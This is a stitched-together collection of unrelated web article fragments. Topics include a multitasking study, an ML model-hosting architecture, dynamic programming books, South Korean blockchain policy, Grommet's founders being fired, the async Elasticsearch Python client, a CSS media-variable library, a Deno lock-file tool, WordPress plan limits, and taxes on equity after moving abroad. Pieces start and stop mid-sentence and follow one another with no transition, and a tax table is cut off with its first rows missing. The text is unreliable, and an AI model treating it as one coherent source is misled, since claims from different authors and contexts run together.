arrows.</p><p>At first, all students answered correctly right away, without much trouble. As the number of blue arrows increased (the number of red arrows stayed the same; only their position changed), however, the students accustomed to multitasking had serious trouble counting ‘the red arrows in the time allotted, or as quickly.as the students who did not habitually multitask, for one very simple reason: They got distracted by the blue arrows! Their brains were trained to pay attention to every stimulus, regardless of its importance, while the brains of the other students were trained to focus on a single task—in this case, counting the red arrows and ignoring the blue ones.</p><p>Other studies indicate that working on several things at once lowers our productivity by at least 60 percent and our IQ by more than ten points.</p><p>One study funded by the Swedish Council for Working Life and Social Research found that a sample group of more than four thousand young adults between the ages of twenty and twenty-four who were addicted to their smartphones got less sleep, felt less connected to their community at school, and.were more …</p></div></div>

                    <p>Inferrd is built on proven technologies that allow us, as developers, to focus on making the experience great. You might think building a hosting platform is a lot of headaches, not anymore!</p><p>I have been wanting to build something similar to Inferrd for 2 years now, but I never had the tools to do so. That is until a few months ago.</p><p>Google recently announced <a href="https://cloud.google.com/run">Cloud Run</a>. It allows anyone to deploy containers in production really fast. The best part is the pricing: one only pays for the milliseconds that they use. The container becomes "alive" when a request comes in and "pauses" right after. From our experience, the cold starts are usually around 400ms.</p><h2 id="the-architecture">The Architecture</h2><p>In order to serve someone else's model we had to know for sure that the architecture would be robust and scalable. Reliability is our priority. </p><p>Today, Inferrd runs <em>misson-critical production workloads</em> flawlessly for customers, let's see how.</p><p>The architecture consists of 6 parts: </p><ul><li>The API (on Heroku)</li><li>The Front-End (on Netlify)</li><li>Cloud Run</li><li>Storage (Google Cloud Storage)</li><li>A Postgres Database (on Heroku)</li><li>A Redis Database (on Heroku)</li></ul><p>Here is a simplified schema of the full architecture (minus redis and postgres, which are in the Inferrd API box).</p><figure><img src="https://blog.inferrd.com/content/images/2020/07/Screen-Shot-2020-07-16-at-5.59.22-PM.png" alt="" srcset="https://blog.inferrd.com/content/images/size/w600/2020/07/Screen-Shot-2020-07-16-at-5.59.22-PM.png 600w, https://blog.inferrd.com/content/images/size/w1000/2020/07/Screen-Shot-2020-07-16-at-5.59.22-PM.png 1000w, https://blog.inferrd.com/content/images/2020/07/Screen-Shot-2020-07-16-at-5.59.22-PM.png 1458w" sizes="(min-width: 720px) 720px"><figcaption>Inferrd.com's Architecture</figcaption></figure><p>This architecture is great for a few reasons:</p><ul><li>Every part of it is either scalable or Serverless. 🚀</li><li>CloudRun isolates user's models so we don't have to.</li><li>It is very cheap to run. </li><li>It requires almost no maintenance.</li></ul><p>You might wonder, why do inference requests go through the API first, instead of going straight to Cloud Run. Well, it is a real pain to setup redirections through the Google API (the documentation is seriously laking). Moreover, this allows us to save metrics and logs about models without having to write custom code for every environment.</p><h2 id="environments">Environments</h2><p>Inferrd supports many environments out of the box:</p><ul><li>TensorFlow</li><li>Scikit</li><li>spaCy</li><li>Keras</li><li>others to come...</li></ul><p>We had to make it very easy to push new environments and update existing ones. Environments are basically a docker image with the most up to date version of the frameworks required and a Flask server.</p><p>Cloud Run takes those containers and instantiates them at scale behind a load balancer. That's it. Security and reliability is taking care off by Google Cloud.</p><h3 id="try-inferrd">Try Inferrd</h3><p>Did you enjoy this technical write up and would like to test Inferrd?

The term itself is a bit loaded, with <em>dynamic</em> being a broad word that can apply to many things. So really, what is dynamic programming?</p><p>First of all, the concept of <em>recursion</em> is a prerequisite to understanding dynamic programming. If you do not already have a foundation in data structures &amp; algorithms, I<a href="https://booksoncode.com/articles/data-structures-algorithms"> highly recommend studying Grokking Algorithms</a> first, which is the same book that introduced me to these concepts. </p><p>Simply put, <strong>dynamic programming is an optimization technique used to solve problems.</strong> <strong>This technique chunks the work into tiny pieces so that the same work is being performed over and over again.</strong> You may opt to use dynamic programming techniques in a coding interview or throughout your programming career.  </p><p>Dynamic programming caches values so that you don’t have to re-compute operations. This allows you to compute every value just once.</p><p>Great examples of problems you can solve with dynamic programming:</p><ul data-rte-list="default"><li><p>Calculating the Fibonacci sequence. </p></li><li><p>Calculating the amount of change you need to make up a dollar amount. For example, 32 cents USD is one quarter, one nickel, and two pennies. </p></li><li><p>Calculating the number of ways you can add or subtract an array of values to reach a target number. </p></li><li><p>Calculating the optimum combination of items you can include in a knapsack by the knapsack’s weight capacity.</p></li></ul><p>Dynamic programming isn’t best for all problems. In many instances, dynamic programming just can’t help us in the improvement of the runtime of a problem. If your program isn’t performing repeated work, no amount of caching will make any difference.</p><p>If you’re very new to the concept of dynamic programming or have never even heard of it before, don't worry. All of these books on dynamic programming explain the idea in the simplest terms.</p><h2>Overview of the Criteria For the Best Books on Dynamic Programming</h2></div></div><div data-aspect-ratio="50.70422535211267" data-block-type="5" id="block-yui_3_17_2_1_1594947342441_16112"><div>

Before we look ahead, we need to understand why Korea was such a hotbed for cryptocurrencies in the first place. Therefore we will go into a complete breakdown regarding Blockchain in Korea, leading up to 2020. In addition, we will continue to update this article on a quarterly basis so please check back often.</span></p><h2><img src="https://i2.wp.com/seoulz.com/wp-content/uploads/2019/12/1.jpg?resize=700%2C332&amp;ssl=1" alt="Blockchain in Korea" width="700" height="332" srcset="https://i2.wp.com/seoulz.com/wp-content/uploads/2019/12/1.jpg?resize=1024%2C485&amp;ssl=1 1024w, https://i2.wp.com/seoulz.com/wp-content/uploads/2019/12/1.jpg?resize=300%2C142&amp;ssl=1 300w, https://i2.wp.com/seoulz.com/wp-content/uploads/2019/12/1.jpg?resize=768%2C363&amp;ssl=1 768w, https://i2.wp.com/seoulz.com/wp-content/uploads/2019/12/1.jpg?w=1118&amp;ssl=1 1118w" sizes="(max-width: 700px) 100vw, 700px" data-recalc-dims="1">The 2017 Cryptocurrency Boom in Korea Explained</h2><p><span>A fact that not a lot of people know about Korea is that Koreans are not allowed to gamble in Korea. Therefore Koreans are not allowed to enter the half a dozen casinos around Seoul. There is only one location to the far east of Seoul where Koreans are legally allowed to gamble. The Korean government made it very difficult for Koreans to gamble their money away. However, for foreigners in Korea, they welcome gambling. Remember this as we see why Koreans were so fascinated with cryptocurrency back in 2017.&nbsp;</span></p><p><span>Leading up to 2017 there was very little in terms of investment where the average Korean could make large profits in a short amount of time. Add this to the rise in youth unemployment and a slow economy, and you have many Koreans looking for a way out of their struggle. Furthermore, as Koreans started to notice the rise of Bitcoin in the 4th quarter of 2017, many started to invest without really knowing the technology behind Bitcoin. What they knew was that the price was going up and they needed to get in before it was too late. Therefore it is not shocking to hear that 30-40% of working men in Korea had invested in cryptocurrencies. However, men were not alone, pretty much everyone one from grandmas to college women were investing in cryptocurrency.&nbsp;</span></p><h3><b>The Rise of Altcoins in South Korea</b></h3><p><span><img src="https://i0.wp.com/seoulz.com/wp-content/uploads/2019/12/2.jpg?resize=700%2C425&amp;ssl=1" alt="Altcoins in Korea" width="700" height="425" srcset="https://i0.wp.com/seoulz.com/wp-content/uploads/2019/12/2.jpg?w=916&amp;ssl=1 916w, https://i0.wp.com/seoulz.com/wp-content/uploads/2019/12/2.jpg?resize=300%2C182&amp;ssl=1 300w, https://i0.wp.com/seoulz.com/wp-content/uploads/2019/12/2.jpg?resize=768%2C466&amp;ssl=1 768w" sizes="(max-width: 700px) 100vw, 700px" data-recalc-dims="1">Korea quickly became one of the world’s largest markets for Bitcoin and Ethereum, the top 2 cryptocurrencies on the market. Furthermore, some of the top trending topics on Korean social media were on altcoins such as Litecoin, Ripple, EOS, and Monero. It got so crazy that Koreans were paying a premium for cryptocurrencies compared to the rest of the world. This premium was famously called “<a href="https://seoulz.com/the-kimchi-premium-and-bitcoin-arbitrage-explained/">The Kimchi Premium</a>.”&nbsp;</span></p><p><span>This was also the time of the ICO boom in Korea. Many projects were able to raise millions of dollars in a short amount of time. Many of these projects JUST had an idea and a quickly drawn up whitepaper. Soon many Korean companies were quickly looking to launch a “Blockchain” startup or create one. Therefore, this lead to many new “Blockchain” companies coming up left and right. These companies were launching coin after coin and the Korean public were eating them up. This lead to South Koreans getting involved in 33% of all cryptocurrency trading, despite having less than 1% of the world’s population. One of the main reasons for this was that Korean cryptocurrency exchanges had no limits for individuals to purchase cryptocurrency. This would soon change.</span></p><h3><b>The Korean Government Cracks Down on Cryptocurrencies</b></h3><p><span>As the boom was at a fever pitch, the Korean government stepped into a crackdown on cryptocurrencies. Remember early on when I mentioned how Koreans are not able to gamble in Korea? This was the Korean government’s way of “protecting” their citizens. Therefore the Korean government looked at cryptocurrencies as unregulated gambling outlets. In addition in September of 2017, the Korean government made a strong push against ICOs in Korea. Furthermore, in December of 2017, they cracked down on anonymous trading accounts on Korean cryptocurrency exchanges. Add this to the drop in price starting in early 2018 and the Boom was over just like that.</span></p><h2><span><b>The 2018-2019 Mini Blockchain Boom in Korea Explained</b></span></h2><p><span>The Korean government has always been against cryptocurrencies. However, they are intrigued by Blockchain technology. Furthermore, they are interested in how Blockchain technology could bring service platforms to help everyday Koreans. Therefore, Blockchain projects in Korea like <a href="https://seoulz.com/ground-x-the-blockchain-subsidiary-of-internet-giant-kakao/">Ground X</a> and <a href="https://seoulz.com/korean-blockchain-startup-icon-foundation-hyperconnects-the-world/">ICON</a> have started to cooperate with the Korean government to jointly develop Blockchain projects for the public sector. In addition, Seoul’s mayor Park Won-soon revealed his 5-year $150 million plan to turn Seoul into a Blockchain hub. Furthermore, the governor of Jeju Island created an economic zone to nurture Blockchain projects. It was very clear that in regards to Blockchain technology, the Korean government was willing to support it.&nbsp;</span></p><p><img src="https://i2.wp.com/seoulz.com/wp-content/uploads/2019/12/mayor.jpg?resize=701%2C452&amp;ssl=1" alt="Seoul Mayor" width="701" height="452" srcset="https://i2.wp.com/seoulz.com/wp-content/uploads/2019/12/mayor.jpg?w=710&amp;ssl=1 710w, https://i2.wp.com/seoulz.com/wp-content/uploads/2019/12/mayor.jpg?resize=300%2C194&amp;ssl=1 300w" sizes="(max-width: 701px) 100vw, 701px" data-recalc-dims="1"></p><blockquote><p>“There’s no doubt Blockchain is the core technology of the 4th Industrial revolution, which will shape the future IT industry. In addition, I will make efforts to help <a href="https://seoulz.com/seoul-to-launch-their-own-cryptocurrency-the-s-coin-in-2020/">Seoul become the center of a Blockchain industry ecosystem</a>,” said Seoul Mayor, Park Won-soon.</p></blockquote><h2>South Korea Passes First Laws Regarding Cryptocurrency in 2020</h2><p>A comprehensive cryptocurrency law was passed by The South Korean National Assembly in 2020. This will be used as the framework for future regulations and is a great step towards the legalization of cryptocurrencies in Korea. The vote was unanimous as many of the assembly members showed support in embracing this new innovative technology. The assembly passed an amendment to Korea’s financial regulators to develop rules around anti-money laundering and regulate the cryptocurrency industry. Therefore, this first law is a great step for the Korean Blockchain ecosystem. Now Blockchain startups and exchanges can transition into the law’s new regulations. In addition, because of the impact of the coronavirus on Korea’s economy, it seems Korean officials are doing their best to promote innovation around tech to help boost the economy moving forward.</p><h2><b>The Support of Blockchain Technology by the Korean government</b></h2><p>The South Korean government plans to invest over $48 billion in Blockchain and other 4th Industrial revolution technologies by 2025. South Korean President Moon Jae-in has been very supportive of Blockchain technologies. His aim is to use these new technologies to create over half a million jobs across not only Blockchain but also AI, 5G networks, and Big Data.</p><blockquote><p>“The fourth industrial revolution and digital civilization are the future of humanity that has already begun. The national development strategy to advance in the trend is the Korean version of the new deal. It is possible to jump from the older economy to the leading economy.” Said South Korean President Moon Jae-in.</p></blockquote><p><span>Korea loves technology and Blockchain is the technology of the future. The Korean government understands this. Furthermore, there is a large potential for mass adoption of Blockchain in industries like health, trading, IP rights, logistics, supply chain, real estate, and finance. Therefore they have made great efforts in Blockchain education to train future Korean entrepreneurs in the Blockchain industry. Seoul is leading the way as they are looking to incorporate Blockchain technology into its infrastructure.&nbsp;</span></p><h2>The Blockchain Technology Validation Support in 2020</h2><p>The Ministry of Science and ICT and the Ministry of Information and Communication Industry Promotion will launch its pilot program in 2020 called <em>Blockchain Technology Validation Support in 2020</em>. They will pick 9 Blockchain startups in Korea and give them $360,000 in funding. The Korean Blockchain startups will be selected based on these key factors:</p><ul><li>Current performance</li><li>Potential of future performance</li><li>Feasibility of the technology</li><li>Solid business plan</li><li>Expected results</li><li>Job creation potential</li><li>Must offer services that can create economic and social value through Blockchain technology</li></ul><h3><span><b>Korean Government Agencies Supporting Blockchain Technology</b></span></h3><ul><li><span><a href="http://english.msip.go.kr/english/main/main.do"><strong>Ministry of Science and Technology (ICT)</strong></a> – Will invest over $380 million over 6 years (2021-2026) into Blockchain Research and Development.

Me and Joanne in front of one of our four homemade Grommet backdrops that were featured in all of our early videos.</p></div>
<p>Late last month, my Grommet co-founder Joanne Domeniconi and I were fired. Our majority shareholder Ace Hardware made the call, as is their right. It happens when visions for a company diverge.</p>
<p>Joanne and I are sad to abandon our Citizen Commerce™ mission and not see Grommet through to becoming a household name. But we feel nothing but a great deal of pride when we reflect on the hundreds of careers we shaped, the more than 3,000 small businesses we accelerated, and the thousands of jobs we created. We grew to a meaningful scale: where we could legitimately move markets and create demand for previously unheard-of products and even create new product categories. No one had heard of brands like SodaStream, Fitbit, OtterBox, PopSockets, S’well, Bombas, SimpliSafe and Mrs. Meyers when we embraced and launched them.</p>
<p>Upon hearing the news one Grommet maker wrote, “<em>I have said it so many times it must sound like a broken record, but what you created was pure magic</em>!”&nbsp; For a small business with an innovative product, breaking through in a crowded consumer world is excruciatingly difficult. Each Grommet we launched benefited handsomely from our reputation, credibility, and gaining access to our 4M followers.&nbsp; I always saw being chosen as a Grommet as cutting two years of struggle out of their path. Many awesome companies would have died on the vine if it were not for Grommet.</p>

<p>We employed hundreds of the best and brightest.&nbsp; One of the current team members said, “<em>The Grommet has made an impression on me in many ways in the three years since I joined. I’ve worked for a number of small companies now, and while most of their founders have had “hustle” to spare, I have not encountered&nbsp;anyone else with your commitment to&nbsp;values.&nbsp;I did not choose a career path which automatically involves helping others (doctor, nonprofit, etc.), so it has been a comfort to work for someone who steers the ship with moral conviction</em>.”</p>

<p>Lynda Applegate, a Harvard Business School professor, wrote a popular case on The Grommet. Out of the thousands of potential case study subjects at her disposal she chose Grommet because she said we were the kind of business that could uniquely thrive in a <strong>modern</strong> economy—with a groundbreaking approach to creating value for multiple parties. Here’s a small slice of what that means to me: I believe that each person in a company is sacred and capable of leadership. When individuals are <strong>truly</strong> engaged toward a common purpose, powerful gains can be delivered for customers, suppliers, society, and the planet. It is then that a great business–measured in revenue and profits–can also be a great company.&nbsp; I was not interested in one without the other. This is what Lynda recognized.</p>
<p>I also hope our Grommet alums will be brave on the innovation front. As one of our investors John Landry told me, “If you aren’t the lead dog you are just sniffing someone else’s butt.”&nbsp; We originated the use of video in e-commerce. We were the first company to assign societal/personal values to the products we sold. While corporations today are scrambling to show they “care” about products from minority or queer or veteran entrepreneurs, or from social enterprises, or about American made sourcing—moves that I wholeheartedly applaud—I take pride that we sourced all of our products according to those kind of values from Day One.</p>

<p>It seems so basic, but we built a company whose people and products you could trust implicitly. If retail were not a catastrophic race to the bottom, “trustworthiness” would not be a distinctive competitive asset–but it was at The Grommet. And it was measurable. While most e-commerce companies find that dissatisfied customers return 15-25% of what is bought, our customers only returned 3% of Grommets. And these are products from totally unknown small businesses. 3%!! This is because we curated carefully and only launched products worth buying, from people worth supporting.</p>

Our investors Bruce and Bridgett Evans, Jill Preotle, and Peter Lynch hosted a progressive dinner for our whole team to enjoy.</p></div>
<p>As a CEO, I am proud that we defied the odds and built a large-scale business, and shepherded it successfully through two financial crises and a global pandemic. We also defied the odds in attracting visionary angel investors like Peter Lynch and Jill Preotle–in a world where women founders get 2.7% of the funding from venture capitalists.&nbsp; We navigated not just one, but two, strategic investors over seven years.&nbsp; A public company CFO friend told me after the first investment (from the wonderful Rakuten) “<em>I have bought many companies. It never works for the founders. You won’t last six months.</em>” Ha!&nbsp; Joanne and I are not quitters. And we not only defied the odds in scaling the business, but also remained friends and partners throughout. We came into the venture together and there is poetry in the fact that we left Grommet the same way. Joanne and I were always a package deal.</p>
<p>I know this is kind of sappy, but I will think back at Grommet under our leadership as a form of “Camelot” for our team, our Makers and ourselves. My greatest hope is that Grommet alums will go on to use the lessons of how a business can both do good and do well. I know Grommet team members will be contributory to–and demanding of–their future employers when it comes to both ethical and executional standards. We all certainly learned a valuable lesson that one cannot simultaneously grow and harvest the same company–you have to pick a lane.</p>
<p><em>Sidebar: for some reason beyond my understanding, our amazing VP of Operations Jason McCarthy was also terminated. The company was on a fantastic 2020 trajectory with revenues up 50% over plan in May and 25% for the year. Jason was very, very central to that success—our business was extremely operationally intense. Jason is a dynamic leader whose teams will follow him anywhere. &nbsp;He was my go-to person for many things from brainstorming new initiatives to putting models and plans to an analytical or real-world test.&nbsp; At Grommet he had the broadest portfolio of responsibilities among all my reports, including Logistics, Inventory Planning, Account Management, Growth Services and Customer Support. &nbsp;He also founded and built our Wholesale business. &nbsp;Beyond all that he is a culture builder who earned deep respect and loyalty during his seven year+ tenure at Grommet, including mine of course. I will be very happy to introduce him to worthy employers and startup teams.</em></p>
<p>At the end of the day (and our run), while the future course of Grommet will not include its founders’ drive and hustle, or our moral and spiritual guidance, we are happy to have shown the way for individuals and companies to support small businesses, to celebrate&nbsp; the work of underrepresented entrepreneurs, to seek out quality products, and to honor trustworthy people.&nbsp; Grommet was the culmination of my life’s work—and Joanne’s. We share a deep satisfaction and priceless legacy with the many talented and committed individuals who made it all happen.&nbsp; I have no regrets. This is the simplest definition of success that I know.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>With the increasing popularity of Python web frameworks supporting asynchronous I/O like <a href="https://fastapi.tiangolo.com/">FastAPI</a>, <a href="https://www.starlette.io/">Starlette</a>, and <a href="https://docs.djangoproject.com/en/3.1/releases/3.1">soon in Django 3.1</a>, there has been a growing demand for native async I/O support in the Python Elasticsearch client.&nbsp; Async I/O is exciting because your application can use system resources efficiently compared to a traditional multi-threaded application, which leads to better performance on I/O-heavy workloads, like when serving a web application. </p> <p>The wait is over! Native async / await support is now available in <a href="https://www.elastic.co/guide/en/elasticsearch/client/python-api/current/index.html">version 7.8.0 of the package</a>, alongside support for all the shiny new Elasticsearch 7.8 APIs. To follow along with the below examples you’ll need Python 3.6 or later installed locally and an Elasticsearch 7.x cluster running. </p> <p><strong><h2>Installing and using the Elasticsearch Python client</h2></strong></p><p>Install the package using the <code>[async]</code> extra to install an additional dependency, <a href="https://docs.aiohttp.org/">Aiohttp</a>, which is used to make HTTP requests to your Elasticsearch instances: </p> <pre>$ python -m pip install elasticsearch[async] </pre> <p>After being successfully installed, you can now access an async native Elasticsearch client from Python.&nbsp; </p> <p>To show async in action, I’ll demonstrate&nbsp;using <a href="https://ipython.org/">IPython</a> since an event loop is available right away, allowing me to call <code>await</code> from the REPL. I’ll connect to an Elasticsearch instance hosted in <a href="https://www.elastic.co/cloud">Elastic Cloud</a> using the <a href="https://elasticsearch-py.readthedocs.io/en/master/#connecting-via-cloud-id"><code>cloud_id</code> parameter</a> for this quick demonstration: </p> <pre>$ ipython 
In [1]: from elasticsearch import AsyncElasticsearch 
In [2]: es = AsyncElasticsearch( 
   ...:   cloud_id=”async-example:cGVla2Fib28h...”, 
   ...:   http_auth=(“elastic”, “changeme”) 
   ...: ) 
In [3]: es.info()                                                          
Out[3]: &lt;coroutine object info at 0x7f2a59bb6fc0&gt; 
In [4]: # Returns a coroutine! We need to use 'await'                        
In [5]: await es.info()

July 16, 2020 | https://propjockey.github.io/css-media-vars/ | <a href="https://web.archive.org/web/*/https://propjockey.github.io/css-media-vars/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
        css-media-vars adds several --custom-css-variables, all namespaced with "--media-" and based on media queries, onto the HTML tag. These vars act as universal mixins for your CSS values. If the media query is true, your value will be used. If it's false, the var(..., fallback) will be used.</p><p>
        
        For example, there are several named breakpoints that respond to the width of the screen, such as <code>--media-lte-sm</code>.</p><p>
        
        In your CSS, if you want a value to only apply when the screen is less than or equal to the "small" breakpoint range, you mix it into your value:<br>
        <code>--my-small-value: var(--media-lte-sm) 2px;</code><br>
        From this point, you can use your variable anywhere and it will only be "2px" if the media query is true. Else, it uses the fallback you provide, like so:<br>
        <code>border: var(--my-small-value, 15px) solid green;</code><br>
        <img src="https://propjockey.github.io/css-media-vars/suchborder.gif" alt="Border changing size at 900px breakpoint"><br>
        Here's a link to the jsbin pictured in the gif: <a href="https://jsbin.com/giqedowale/edit?css,output">https://jsbin.com/giqedowale/edit?css,output</a></p><p>
        
        If you need multiple break points, all you have to do is mix a different breakpoint into another variable and use it in the first fallback:<br>
        <code>
          --my-small-value: var(--media-lte-sm) 2px;<br>
          --my-medium-value: var(--media-md) 15px;<br>
          border: var(--my-small-value, var(--my-medium-value, 30px)) solid green;<br>
        </code><br>
        In this case, because the small values are listed first, this approach is <b>mobile-first</b>! CSS Variables don't compile the fallback unless it's used (similar to the expected short-circuting of conditionals in JavaScript).</p><p>
        
        This is all vanilla CSS. No JS or build step is necessary.<br>
        The library is small and built on a CSS trick called "Space Toggle" discovered in the development of <a href="http://augmented-ui.com/">augmented-ui</a>. You can read more about Space Toggle in these tweets which contain links to JSBins you can explore further with:<br>
        <a href="https://twitter.com/James0x57/status/1283596399196680192">Second Tweet, a simple demo</a><br>
        <a href="https://twitter.com/James0x57/status/1282303255826046977">First Tweet, an advanced demo</a></p><p>
        
        Browser support for CSS Variables is currently 94% globally according to <a href="https://caniuse.com/#feat=css-variables">caniuse</a>.<br>
        Each of the --media-* vars are using the actual media query in CSS to switch them to the "true" state. Browser support depends on the feature but will always behave as if it's "false" if the media query isn't supported in the user's browser, such as <code>--media-prefers-light</code> which only recently gained traction.

<p>Let's say your module depends on remote module . When you compile your module for the first time is retrieved, compiled and cached. It will remain this way until you run your module on a new machine (say in production) or reload the cache (through for example). But what happens if the content in the remote url is changed? This could lead to your production module running with different dependency code than your local module. Deno's solution to avoid this is to use integrity checking and lock files.</p>
<p>info from <a href="https://deno.land/manual/linking_to_external_code/integrity_checking" rel="noopener noreferrer" target="_blank">deno page</a></p>
<p><strong>use:</strong></p>
<pre><code>$ trex --lock file.ts
</code></pre>
<p>this generates a <code>lock.json</code> file.</p>
<p>if in input file you use <code>import_map.json</code> you can specify it.</p>
<pre><code>$ trex --lock --importmap file.ts
</code></pre>
<p>for more information this is the <a href="https://deno.land/manual/linking_to_external_code/integrity_checking" rel="noopener noreferrer" target="_blank">deno document</a></p>

<p>Usually I set up sites on VPS services like <a href="https://www.digitalocean.com/community/tutorials/how-to-install-wordpress-with-lamp-on-ubuntu-18-04">DigitalOcean</a>, but wanted to get better at producing quick <a href="https://en.wikipedia.org/wiki/Minimum_viable_product">minimum viable</a> proof of concepts. This will mean I focus on creating value, in this case content, instead of having to spend time on <a href="https://www.namecheap.com/resource-center/tutorials/building-your-first-website/">one hundred and one other things</a>.</p>



<p>In this instance I’ve chosen WordPress’s $48/year plan, as I’m used to the platform and willing to forego some of the niceties I’m used to like <a href="https://www.elegantthemes.com/blog/tips-tricks/how-to-connect-to-your-website-via-ssh-and-why-youd-want-to">full control of the machine with SSH access</a>, FTP to upload custom files, <a href="https://www.wpbeginner.com/showcase/24-must-have-wordpress-plugins-for-business-websites/">plugins</a> and additional custom software.</p>



<p>I didn’t expect however that I’d be prevented from making minor adjustments to my site like changing the header colour, centring the site title, changing link colours or fixing spacing.</p>



<p>WordPress also prevent you from removing their “powered by WordPress” advert at the bottom of your site. Although I mind that less because it’s a generally good platform and I’d like to encourage other people to share things they learn, with WordPress remaining a great platform to start doing so.</p>



<p>Just don’t expect much control over how individual things look, or be ready to pay for their $300/year business plan to do so.</p>

                <p>Let’s talk tax! Taxes aren’t the most interesting of topics, but as a mass
exodus from San Francisco begins in the wake of the COVID-19 pandemic, there are
a whole bunch of people working at Silicon Valley tech companies who are going
to have to start dealing with them in much more depth.</p>

<p>In general, people expect that taxes will be complicated in the year that they
move. However, if you’re being granted equity, as most Silicon Valley employees
are, you might be surprised to discover that they will be complicated for much
longer.</p>

<p>If you choose to move internationally, rather than just interstate, this counts
for double. My partner and I — neither of us US citizens — moved from San
Francisco to Sydney three years ago, and have spent the last few years figuring
out our tax situation. We struggled a lot to find good guidance on any of this
online, so I’m going to take the time to document what we learned in a few
posts, so that I can make the path more well-trodden for the next person.</p>

<p>Although I’ve spent a lot of time learning about this, I’m not a tax
professional. If any of it sounds wrong to you, or if you have your own story to

<p>Income taxes sound like they should be simple: at the end of a tax year, you pay
a percentage of the amount that you earned that year to the relevant tax agency.
In some countries, your employer collects these taxes as you earn them
(<a href="https://en.wikipedia.org/wiki/Pay-as-you-earn_tax">PAYE/PAYG</a>), and you need
to think about them even less.</p>

<p>Equity complicates this situation. When you’re granted equity, you’re being
promised something of value. There’s a problem though: that equity might not yet
be liquid — it could have a vesting schedule, you might not have exercised it,
it could be in a private company… and if it’s not liquid, you probably
shouldn’t have to pay anything when it’s given to you. Many tax jurisdictions
handle this by choosing to tax you at a later point: rather than when the equity
is granted, instead taxing you when it vests, is exercised (in the case of
options), or is sold.</p>

<p>However, imagine you move tax jurisdictions between the date where you’re given
the equity, and the date on which you actually pay tax. The first jurisdiction
now has a problem: in their eyes, you earned that equity while you lived there,
and they only gave you a free pass on immediately paying tax on it through the
goodness of their hearts. When you eventually pay tax in the second tax
jurisdiction, they want a piece of that too.</p>

<p>This is a trailing tax liability.</p>

<p>Broadly speaking, any time that you’re granted equity in one jurisdiction, but
only trigger a taxation event on it in another, the first jurisdiction is likely
to say that they also have taxation rights.</p>

<p>That first jurisdiction is said to have “source” taxation rights, because that’s
where the asset was sourced, while the second is said to have “residency”
taxation rights, i.e. the right to tax you because you are presently a resident.</p>

<h3 id="apportioning-income">💰Apportioning income</h3>
<p>Now presumably, if you worked in both jurisdictions between the point where you
were given the equity, and the point at which you pay tax, there’s some
percentage that each should be considered the source of.</p>

<p>Internationally, this apportionment is governed by pairwise tax treaties between
countries. These are typically based on the
<a href="https://read.oecd-ilibrary.org/taxation/model-tax-convention-on-income-and-on-capital-condensed-version-2017_mtc_cond-2017-en#page28">OECD model tax convention</a>,
which helpfully has an in-depth commentary on this exact point
(<a href="https://read.oecd-ilibrary.org/taxation/model-tax-convention-on-income-and-on-capital-condensed-version-2017_mtc_cond-2017-en#page329">Commentary on Article 15, 12.14</a>).
In short, unless otherwise agreed between two countries, income is allocated
based on the percentage of <em>workdays</em> spent in each jurisdiction, from the day
the equity was granted, to the day that it vested. Note that this percentage
will differ for each tranche, or part of a grant, that vests on a different day.</p>

<p>However, those treaties only apply at the country to country level, i.e. for
taxes levied federally. In addition to imposing federal taxes, the US also has
state taxes, and these are not governed by international tax treaties.</p>

<p>That allows states to take a different view of how to decide whether income
belongs to them, and in fact, they do. For restricted stock, California takes
the same view as the tax treaty, and considers the period from grant to
vest. However, for someone granted options in California, who is a non-resident
when they exercise those options, the source is calculated by the percentage of
workdays spent in California from grant to <em>exercise</em>, rather than to vest (per
the <a href="https://www.ftb.ca.gov/forms/misc/1004.html">Equity-Based Compensation Guidelines</a>).</p>

<h3 id="residency-taxation">🏠Residency taxation</h3>
<p>But the tax doesn’t stop there! In addition to the source jurisdiction taxing
you for the percentage they believe is theirs, the jurisdiction in which you are
currently a resident will also want to tax you, typically on 100% of the
income you earn from an asset. This can lead to double taxation: residency
taxation means you need to pay tax on 100% of the income to your current tax
jurisdiction, but you also need to pay tax on some percentage of the income
(potentially up to 100% again) to the source jurisdiction.</p>

<p>Many tax agencies provide relief against this situation, in the form of tax
credits: if you’ve already had to pay tax in one location for the same event,
they won’t charge you again.</p>

<h3 id="worked-example">📔Worked example</h3>
<p>That’s a lot to take in, so let’s work through an example:</p>

<p>Let’s assume you were granted 1,000 non-qualified stock options (NSOs) with a
strike price of $1.00, on 2018-07-01, while a tax resident of California.
The options vest once a year for the next four years, in four equal tranches of
250.</p>

<p>(If you’re not familiar with options, an NSO gives you the right to purchase a
given company’s stock at a given price, regardless of its current market value.
In this case, the option would be valuable if the company’s stock price rose
above $1.00, because you could exercise your right to pay the company $1.00 for
a share, and then immediately sell that share at its market value, taking the
difference as a profit, and consequently, as income.)</p>

<p>About a year and a half later, on 2020-03-01, you move from California to
Melbourne, Australia. We can figure out the source of each of those tranches
like so:</p>

<table>
  <thead>
    <tr>
      <th>Tranche</th>
      <th>Relevant work period</th>
      <th>Total workdays</th>
      <th>US workdays</th>
      <th>AU workdays</th>
      <th>US source %</th>
      <th>AU source %</th>

      <td>209</td>
      <td>174</td>
      <td>35</td>
      <td>83%</td>
      <td>17%</td>
    </tr>
    <tr>
      <td>2021-07-01</td>
      <td>2018-07-01 – 2021-07-01</td>
      <td>313</td>
      <td>174</td>
      <td>139</td>
      <td>56%</td>
      <td>44%</td>
    </tr>
    <tr>
      <td>2022-07-01</td>
      <td>2018-07-01 – 2022-07-01</td>
      <td>417</td>
      <td>174</td>
      <td>243</td>
      <td>42%</td>
      <td>58%</td>
    </tr>
  </tbody>
</table>

<p>Internationally, these percentages apply regardless of when you choose to
exercise those options, provided you do so after the date you move to Australia.
However, those options are also subject to taxation within California, and as
we’ve mentioned, the tax agency there believes in a different source percentage
scheme.</p>

<p>Let’s say that you don’t touch that equity until three years after your move,
on 2023-03-01, when you choose to exercise it all.</p>

<p>If we assume that once exercised, but not prior, your options become liquid
shares, you’ll be taxed by each of the US federally, California, and Australia
on the day you exercise. Taking just the 2020-07-01 tranche into consideration:</p>

<ul>
  <li>you’ll be taxed on 83% of the income in the US,</li>
  <li>you’ll be taxed on 36% of the income in California, and</li>
  <li>you’ll be taxed on 100% of the income in Australia, which has residency
 taxation rights. However, you’ll be able to get tax credits for tax paid
 in the US federally on the 83% of the income considered to be foreign-sourced.</li>
</ul>

<p>This means that despite having lived outside of the US and California for 3
years on the date of exercise, you’ll still need to declare US and Californian
income, and pay tax in those jurisdictions. If you’d moved interstate within the
US, you’d still be filing federal returns regardless, but you’d also be required
